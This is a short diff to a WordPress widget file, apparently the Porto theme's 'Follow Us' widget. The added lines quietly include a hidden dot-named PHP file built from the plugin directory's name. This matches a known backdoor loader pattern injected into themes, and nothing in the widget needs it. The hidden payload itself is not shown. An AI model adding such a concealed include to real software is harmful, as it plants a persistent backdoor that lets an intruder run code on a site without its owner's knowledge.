@@ -5,6 +5,10 @@ function porto_follow_us_load_widgets() {
 	register_widget( 'Porto_Follow_Us_Widget' );
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Porto_Follow_Us_Widget extends WP_Widget {
 
 	public function __construct() {
